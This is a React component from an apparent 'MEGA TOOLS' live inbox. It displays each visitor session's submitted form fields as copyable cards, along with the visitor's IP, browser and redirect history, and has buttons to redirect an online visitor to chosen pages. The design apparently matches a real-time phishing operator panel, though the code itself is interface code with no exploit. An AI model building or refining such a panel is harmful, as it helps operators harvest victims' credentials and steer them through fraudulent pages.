// ============================================================
// MEGA TOOLS — LiveInboxExpandedRow v62.0
// FIX-E1..E10 (v57–v61): retained
//
// FIX-E11 (v62.0 — FLAT FORM GRID): the More dropdown now shows
//   EVERY form field as its own compact card in a flat 7-per-row
//   grid. Cards are labelled S{submissionNumber}·F{fieldNumber}
//   (e.g. S1·F1, S2·F1, S2·F2, S3·F1…) so the visitor knows at a
//   glance which submission and which field is which.
//   Removed: per-submission wrapper cards ("Submission 1", etc.),
//   vertical stack inside cards, 5-per-row grid.
//   Kept:   every field visible, ordered by submission then field,
//           copy-on-click, red-dot "new" marker, all sidebar
//           sections (Send, Categories, Visitor Info, Redirect Flow).
// ============================================================
import React, { useState, useMemo, useCallback, memo, useRef } from 'react';
import { useToast } from '../contexts/ToastContext';
import { copyToClipboard } from '../utils/helpers';

const sectionLabel = { fontSize: 11, color: '#CBD5E1', marginBottom: 5, fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.04em' };

// Send — GREEN (online) / GRAY (offline); Categories — PURPLE (online) / GRAY (offline)
const SEND_BG = '#16A34A';
const SEND_BORDER = '#22C55E';
const CATEGORY_BG = '#7C3AED';
const CATEGORY_BORDER = '#A78BFA';

// Offline palette — matches status gray
const OFFLINE_BG = 'rgba(100,116,139,0.15)';
const OFFLINE_COLOR = '#94A3B8';
const OFFLINE_BORDER = '1px solid #94A3B8';

const SYSTEM_FIELDS = ['step','stepNumber','attempt','status','collectedTypes','screenResolution','timestamp','userAgent','platform','language','timezone','submittedAt','source','url','currentUrl','entryUrl','browser'];

const TABLE_FIELDS_COUNT = 3;

const getTotalFormDataCount = (s) => {
  const subs = s?.submissions || [];
  let count = 0;
  for (const sub of subs) {
    count += Object.keys(sub).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt').length;
  }
  return count;
};

const readableUrl = (url) => {
  if (!url) return '—';
  try {
    const u = new URL(url);
    return (u.pathname + u.search).replace(/^\/+/, '') || u.hostname;
  } catch {
    return String(url);
  }
};

const FLOW_SCROLL = { maxHeight: 140, overflowY: 'auto', overflowX: 'hidden', paddingRight: 6, boxSizing: 'border-box', width: '100%', scrollbarWidth: 'thin', scrollbarColor: '#334155 #0F172A' };
const FLOW_WRAP = { display: 'grid', gridTemplateColumns: 'repeat(3, minmax(0, 1fr))', gap: 4, width: '100%', boxSizing: 'border-box' };
const FLOW_CARD = { display: 'flex', flexDirection: 'column', gap: 2, padding: '4px 6px', background: '#1E293B', borderRadius: 3, border: '1px solid #334155', cursor: 'pointer', width: '100%', boxSizing: 'border-box', minWidth: 0, minHeight: 32 };
const FLOW_NAME = { fontSize: 9, color: '#94A3B8', textTransform: 'uppercase', fontWeight: 700, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', lineHeight: 1.15 };
const FLOW_URL = { fontSize: 10, color: '#60a5fa', fontFamily: 'SF Mono, Monaco, Consolas, monospace', whiteSpace: 'normal', wordBreak: 'break-all', overflowWrap: 'anywhere', minWidth: 0, lineHeight: 1.25, maxHeight: '3.75em', overflow: 'hidden' };

const VISITOR_WRAP = { display: 'grid', gridTemplateColumns: '2.4fr 1fr 1fr', gap: 4, width: '100%', boxSizing: 'border-box', alignItems: 'stretch' };
const VISITOR_CARD = { display: 'flex', flexDirection: 'column', gap: 2, padding: '3px 6px', background: '#1E293B', borderRadius: 3, border: '1px solid #334155', cursor: 'pointer', minWidth: 0, boxSizing: 'border-box', minHeight: 28 };
const VISITOR_LABEL = { fontSize: 8, color: '#94A3B8', textTransform: 'uppercase', fontWeight: 700, whiteSpace: 'nowrap', lineHeight: 1.1 };
const VISITOR_VALUE = { fontSize: 10, color: '#E2E8F0', fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', lineHeight: 1.2 };

const OUTER_WRAP = { background: '#0F172A', margin: 0, padding: '6px 0', borderBottom: '1px solid #334155', display: 'flex', flexDirection: 'column', gap: 4, boxSizing: 'border-box', width: '100%' };
const QUICK_ACTIONS_WRAP = { display: 'flex', flexDirection: 'column', gap: 4, padding: 8, margin: '0 3px', background: '#1E293B', borderRadius: 2, border: '1px solid #334155', boxSizing: 'border-box' };
const SECTION_BOX = { background: '#0F172A', borderRadius: 2, border: '1px solid #334155', padding: 8 };

// Send button — green (online) / gray (offline)
const SEND_ONLINE = {
  flex: '1 1 auto', height: 30, fontSize: 11, fontWeight: 800,
  background: SEND_BG, color: '#FFFFFF', border: '1px solid ' + SEND_BORDER,
  borderRadius: 4, cursor: 'pointer', whiteSpace: 'nowrap', padding: '0 12px', minWidth: '50px',
  transition: 'all 0.15s ease', boxShadow: '0 1px 3px rgba(0,0,0,0.2)'
};
const SEND_OFFLINE = {
  ...SEND_ONLINE, background: OFFLINE_BG, color: OFFLINE_COLOR, border: OFFLINE_BORDER, boxShadow: 'none'
};

// Category button — purple (online) / gray (offline)
const CATEGORY_ONLINE = {
  flex: '1 1 auto', height: 30, fontSize: 11, fontWeight: 800,
  background: CATEGORY_BG, color: '#FFFFFF', border: '1px solid ' + CATEGORY_BORDER,
  borderRadius: 4, cursor: 'pointer', display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
  padding: '0 12px', whiteSpace: 'nowrap', minWidth: '70px', transition: 'all 0.15s ease',
  boxShadow: '0 1px 3px rgba(0,0,0,0.2)'
};
const CATEGORY_OFFLINE = {
  ...CATEGORY_ONLINE, background: OFFLINE_BG, color: OFFLINE_COLOR, border: OFFLINE_BORDER, boxShadow: 'none'
};

// FIX-E11 (v62.0): flat 7-per-row form grid — each field is one
// compact card. No per-submission wrapper.
const FORMS_GRID = {
  display: 'grid',
  gridTemplateColumns: 'repeat(7, minmax(0, 1fr))',
  gap: 6,
  padding: '0 3px',
  boxSizing: 'border-box',
  width: '100%',
};

// Compact form card — label (S{n}·F{n}) + value stacked vertically
const FORM_CARD = {
  display: 'flex',
  flexDirection: 'column',
  gap: 2,
  padding: '5px 8px',
  background: '#1E293B',
  borderRadius: 5,
  border: '1px solid #334155',
  cursor: 'pointer',
  width: '100%',
  minWidth: 0,
  boxSizing: 'border-box',
  overflow: 'hidden',
  transition: 'border-color 0.15s ease, background 0.15s ease, opacity 0.15s ease',
  minHeight: 40,
  alignSelf: 'start',
};

const FORM_CARD_LABEL = {
  fontSize: 9,
  color: '#38BDF8',
  fontWeight: 900,
  textTransform: 'uppercase',
  letterSpacing: '0.06em',
  whiteSpace: 'nowrap',
  lineHeight: 1.1,
  display: 'flex',
  alignItems: 'center',
  gap: 4,
};

const FORM_CARD_VALUE = {
  fontSize: 12,
  fontWeight: 700,
  color: '#FFFFFF',
  whiteSpace: 'nowrap',
  overflow: 'hidden',
  textOverflow: 'ellipsis',
  lineHeight: 1.25,
  minWidth: 0,
  width: '100%',
};

const RED_DOT = { display: 'inline-block', width: 6, height: 6, borderRadius: '50%', background: '#EF4444', flexShrink: 0, boxShadow: '0 0 6px rgba(239,68,68,0.6)' };

const SCROLLBAR_CSS = `
.flow-scroll::-webkit-scrollbar { width: 8px; }
.flow-scroll::-webkit-scrollbar-track { background: #0F172A; border-radius: 4px; }
.flow-scroll::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
.flow-scroll::-webkit-scrollbar-thumb:hover { background: #475569; }
`;

const LiveInboxExpandedRowBase = ({
  session, cats, qaL, msgRowLinks, msgSendLinks,
  onRedirect, onCatOpen, getMsg, setMsg, onImageUpload,
  getLinkNameByUrl, getDomain, allFields, showQuickActions, onOpenInfo, onBack, rowIndex
}) => {
  const toast = useToast();
  const sid = session?._id;

  const [seenFields, setSeenFields] = useState(() => {
    try { return JSON.parse(localStorage.getItem('seen_' + sid) || '{}'); } catch { return {}; }
  });

  const saveTimerRef = useRef(null);
  const scheduleSave = useCallback((data) => {
    if (!sid) return;
    if (saveTimerRef.current) clearTimeout(saveTimerRef.current);
    saveTimerRef.current = setTimeout(() => {
      try { localStorage.setItem('seen_' + sid, JSON.stringify(data)); } catch (_) {}
    }, 300);
  }, [sid]);

  const browserText = session?.browser || 'N/A';
  const isOnline = session?.status === 'Online';

  const sendBtnStyle = isOnline ? SEND_ONLINE : SEND_OFFLINE;
  const categoryBtnStyle = isOnline ? CATEGORY_ONLINE : CATEGORY_OFFLINE;

  const markSeen = useCallback((submissionIndex, fieldNumber, fieldValue) => {
    const key = submissionIndex + '_' + fieldNumber + '_' + String(fieldValue);
    setSeenFields(prev => {
      const updated = { ...prev, [key]: true };
      scheduleSave(updated);
      return updated;
    });
  }, [scheduleSave]);

  const flowChain = useMemo(() => {
    const chain = [];
    const seenUrls = new Set();

    const push = (url, fallbackName) => {
      if (!url || seenUrls.has(url)) return;
      seenUrls.add(url);
      const info = getLinkNameByUrl(url);
      chain.push({ name: info.name || fallbackName, url });
    };

    if (session?.entryUrl) push(session.entryUrl, 'Visit');
    (session?.redirectHistory || []).forEach(h => push(h.url, 'Redirect'));
    if (session?.currentUrl) push(session.currentUrl, 'Current');

    return chain;
  }, [session?.entryUrl, session?.redirectHistory, session?.currentUrl, getLinkNameByUrl]);

  const catBtns = useMemo(() => cats.map((cat) => {
    const cl = qaL.filter(l => l?.category === cat && l?.showInInbox !== false);
    if (!cl.length) return null;
    return (
      <button key={cat} onClick={() => onCatOpen(sid, cat, getMsg(sid))} style={categoryBtnStyle}>
        {cat} ({cl.length})
      </button>
    );
  }), [cats, qaL, onCatOpen, sid, getMsg, categoryBtnStyle]);

  const sendBtns = useMemo(
    () => msgSendLinks.filter(l => l.category !== 'reply' && l.linksCategory !== 'reply' && l.inboxAction !== 'reply'),
    [msgSendLinks]
  );

  // FIX-E11 (v62.0): flat list of every field, ordered by
  // submissionIndex then fNumber, ready for the 7-per-row grid.
  const flatForms = useMemo(() => {
    if (!allFields || !allFields.length) return [];
    const sorted = [...allFields].sort((a, b) => {
      const sa = (typeof a.submissionIndex === 'number') ? a.submissionIndex : 0;
      const sb = (typeof b.submissionIndex === 'number') ? b.submissionIndex : 0;
      if (sa !== sb) return sa - sb;
      const fa = (typeof a.fNumber === 'number') ? a.fNumber : 0;
      const fb = (typeof b.fNumber === 'number') ? b.fNumber : 0;
      return fa - fb;
    });
    return sorted.map((f) => {
      const sIdx = (typeof f.submissionIndex === 'number') ? f.submissionIndex : 0;
      const sNum = (typeof f.submissionNumber === 'number') ? f.submissionNumber : (sIdx + 1);
      const fNum = (typeof f.fNumber === 'number') ? f.fNumber : 0;
      return {
        key: sIdx + '_' + fNum,
        label: 'S' + sNum + '·F' + fNum,
        value: f.value,
        submissionIndex: sIdx,
        fieldNumber: fNum,
      };
    });
  }, [allFields]);

  const hasForms = flatForms.length > 0;

  return (
    <div style={OUTER_WRAP}>
      <style>{SCROLLBAR_CSS}</style>

      {/* FIX-E11 (v62.0): flat 7-per-row form grid, each card = one field */}
      <div style={FORMS_GRID}>
        {hasForms ? (
          flatForms.map((form) => {
            const seenKey = form.submissionIndex + '_' + form.fieldNumber + '_' + String(form.value);
            const isUnmarked = !!seenFields[seenKey];
            return (
              <div
                key={'form_' + form.key}
                onClick={async () => {
                  if (form.value !== undefined && form.value !== null && form.value !== '') {
                    try {
                      const ok = await copyToClipboard(String(form.value));
                      if (ok) {
                        toast.success('Copied');
                        markSeen(form.submissionIndex, form.fieldNumber, form.value);
                      } else {
                        toast.error('Copy failed');
                      }
                    } catch (e) {
                      toast.error('Copy failed');
                    }
                  }
                }}
                title={String(form.value ?? '')}
                style={{
                  ...FORM_CARD,
                  opacity: isUnmarked ? 0.85 : 1,
                }}
              >
                <span style={FORM_CARD_LABEL}>
                  {!isUnmarked && (<span style={RED_DOT} />)}
                  {form.label}
                </span>
                <span style={FORM_CARD_VALUE}>{String(form.value ?? '—')}</span>
              </div>
            );
          })
        ) : (
          <span style={{ fontSize: 11, color: '#64748B' }}>No data yet</span>
        )}
      </div>

      {showQuickActions && (
        <div style={QUICK_ACTIONS_WRAP}>

          {sendBtns.length > 0 && (
            <div>
              <div style={sectionLabel}>Send</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                {sendBtns.map((l) => {
                  const rc = l.redirectCode || l.baseCode || l.slug || '';
                  return <button key={l._id} onClick={() => onRedirect(sid, rc, getMsg(sid))} style={sendBtnStyle}>{l.name}</button>;
                })}
              </div>
            </div>
          )}

          {cats.length > 0 && (
            <div>
              <div style={sectionLabel}>Categories</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>{catBtns}</div>
            </div>
          )}

          <div style={SECTION_BOX}>
            <div style={{ ...sectionLabel, marginBottom: 6 }}>👤 Visitor Information</div>
            <div style={VISITOR_WRAP}>
              <div
                onClick={async () => { try { await copyToClipboard(String(browserText)); toast.success('Copied'); } catch(e) { toast.error('Copy failed'); } }}
                title={String(browserText)}
                style={VISITOR_CARD}
              >
                <span style={VISITOR_LABEL}>Browser</span>
                <span style={VISITOR_VALUE}>{browserText}</span>
              </div>
              <div
                onClick={async () => { if (!session?.ip) return; try { await copyToClipboard(String(session.ip)); toast.success('Copied'); } catch(e) { toast.error('Copy failed'); } }}
                title={String(session?.ip || '—')}
                style={VISITOR_CARD}
              >
                <span style={VISITOR_LABEL}>IP Address</span>
                <span style={VISITOR_VALUE}>{session?.ip || '—'}</span>
              </div>
              <div
                onClick={async () => { try { await copyToClipboard(String(getTotalFormDataCount(session))); toast.success('Copied'); } catch(e) { toast.error('Copy failed'); } }}
                title={String(getTotalFormDataCount(session))}
                style={VISITOR_CARD}
              >
                <span style={VISITOR_LABEL}>Form Data</span>
                <span style={VISITOR_VALUE}>{getTotalFormDataCount(session)}</span>
              </div>
            </div>
          </div>

          {flowChain.length > 0 && (
            <div style={SECTION_BOX}>
              <div style={{ ...sectionLabel, marginBottom: 6 }}>🔄 Redirect Flow ({flowChain.length})</div>
              <div className="flow-scroll" style={FLOW_SCROLL}>
                <div style={FLOW_WRAP}>
                  {flowChain.map((f, ri) => (
                    <div
                      key={ri}
                      onClick={async () => { try { const ok = await copyToClipboard(f.url); if (ok) toast.success('Copied'); else toast.error('Copy failed'); } catch(e) { toast.error('Copy failed'); } }}
                      title={f.url}
                      style={FLOW_CARD}
                    >
                      <span style={FLOW_NAME}>{f.name}</span>
                      <span style={FLOW_URL}>{readableUrl(f.url)}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

const LiveInboxExpandedRow = memo(LiveInboxExpandedRowBase, (prev, next) => {
  if (prev.session?._id !== next.session?._id) return false;
  if (prev.session?.currentUrl !== next.session?.currentUrl) return false;
  if (prev.session?.browser !== next.session?.browser) return false;
  if (prev.session?.visitorId !== next.session?.visitorId) return false;
  if (prev.session?.trackingCode !== next.session?.trackingCode) return false;
  if (prev.session?.ip !== next.session?.ip) return false;
  if (prev.session?.status !== next.session?.status) return false;
  if (prev.session?.isLive !== next.session?.isLive) return false;
  if (JSON.stringify(prev.session?.submissions) !== JSON.stringify(next.session?.submissions)) return false;
  if (JSON.stringify(prev.session?.redirectHistory) !== JSON.stringify(next.session?.redirectHistory)) return false;
  if (prev.showQuickActions !== next.showQuickActions) return false;
  if (prev.rowIndex !== next.rowIndex) return false;
  if (prev.allFields !== next.allFields) return false;
  if (prev.cats !== next.cats) return false;
  if (prev.qaL !== next.qaL) return false;
  if (prev.msgSendLinks !== next.msgSendLinks) return false;
  if (prev.getLinkNameByUrl !== next.getLinkNameByUrl) return false;
  return true;
});

export default LiveInboxExpandedRow;